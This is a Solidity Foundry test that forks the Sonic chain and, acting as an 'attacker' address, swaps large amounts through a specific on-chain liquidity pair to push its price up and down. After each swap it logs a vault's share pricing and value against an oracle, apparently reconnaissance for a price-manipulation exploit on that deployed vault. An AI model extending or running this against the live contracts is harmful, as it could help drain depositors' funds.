// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function transfer(address,uint256) external returns (bool);
    function decimals() external view returns (uint8);
}
interface IWNative { function deposit() external payable; }
interface IVault {
    function previewShares(uint256,uint256) external view returns (uint256,uint256,uint256);
    function previewAmounts(uint256) external view returns (uint256,uint256);
    function totalSupply() external view returns (uint256);
    function getStrategy() external view returns (address);
    function deposit(uint256,uint256,uint256) external returns (uint256,uint256,uint256);
}
interface IStrategy { function getBalances() external view returns (uint256,uint256); }
interface IOracleHelper { function getPrice() external view returns (uint256); }
interface ILBPair {
    function getActiveId() external view returns (uint24);
    function getBinStep() external view returns (uint16);
    function getReserves() external view returns (uint128,uint128);
    function swap(bool swapForY, address to) external returns (bytes32);
    function getSwapOut(uint128 amountIn, bool swapForY) external view returns (uint128,uint128,uint128);
    function getPriceFromId(uint24 id) external view returns (uint256);
}

contract Probe is Test {
    address constant VAULT=0x6bE5a84D4A92269eC0Eb228B6c4dAdecED4C7D54;
    address constant PAIR=0x9eDE606c7168bb09fF73EbdE7bFD6FcfaBDA9Bc3;
    address constant WETH=0x50c42dEAcD8Fc9773493ED674b675bE577f2634b;
    address constant WS=0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant OH=0x01c871DfFC36eDC4dDf86FB4a9Bc690B3613a80f;

    IVault v=IVault(VAULT);
    ILBPair p=ILBPair(PAIR);
    IStrategy s;
    uint256 price;
    address attacker=address(0xA11CE);

    function setUp() public {
        vm.createSelectFork("sonic", 78400000);
        s=IStrategy(v.getStrategy());
        price=IOracleHelper(OH).getPrice();
    }

    function tvInY() internal view returns (uint256){
        (uint256 x,uint256 y)=s.getBalances();
        return (price*x >> 128)+y;
    }
    function pv() internal view returns (uint256 sh){ (sh,,)=v.previewShares(1e18,0); }

    function logState(string memory tag) internal {
        (uint256 x,uint256 y)=s.getBalances();
        emit log_named_string("--- ", tag);
        emit log_named_uint("activeId", p.getActiveId());
        emit log_named_uint("previewShares(1WETH)", pv());
        emit log_named_uint("totalValueInY", tvInY());
        emit log_named_uint("balX", x); emit log_named_uint("balY", y);
    }

    // push UP: buy WETH with wS (swapForY=false), input wS
    function pushUp(uint256 wsIn) internal {
        vm.deal(attacker, wsIn);
        vm.startPrank(attacker);
        IWNative(WS).deposit{value:wsIn}();
        IERC20(WS).transfer(PAIR, wsIn);
        p.swap(false, attacker);
        vm.stopPrank();
    }
    // push DOWN: sell WETH for wS (swapForY=true), input WETH
    function pushDown(uint256 wethIn) internal {
        deal(WETH, attacker, wethIn);
        vm.startPrank(attacker);
        IERC20(WETH).transfer(PAIR, wethIn);
        p.swap(true, attacker);
        vm.stopPrank();
    }

    function testDirectionSweep() public {
        emit log_named_uint("oraclePrice(scaled 1e6 wS/WETH)", (price* 1e6) >> 128);
        emit log_named_uint("pairSpotPrice_activeId(1e6)", (p.getPriceFromId(p.getActiveId())*1e6)>>128);
        emit log_named_uint("binStep", p.getBinStep());
        logState("BASELINE");

        uint256[] memory ws = new uint256[](6);
        ws[0]=5_000e18; ws[1]=20_000e18; ws[2]=100_000e18; ws[3]=500_000e18; ws[4]=2_000_000e18; ws[5]=10_000_000e18;
        for(uint i=0;i<ws.length;i++){
            uint256 snap=vm.snapshotState();
            pushUp(ws[i]);
            logState(string.concat("UP wsIn=", vm.toString(ws[i]/1e18)));
            vm.revertToState(snap);
        }
        uint256[] memory we = new uint256[](5);
        we[0]=1e18; we[1]=5e18; we[2]=20e18; we[3]=100e18; we[4]=500e18;
        for(uint i=0;i<we.length;i++){
            uint256 snap=vm.snapshotState();
            pushDown(we[i]);
            logState(string.concat("DOWN wethIn=", vm.toString(we[i]/1e18)));
            vm.revertToState(snap);
        }
    }
}
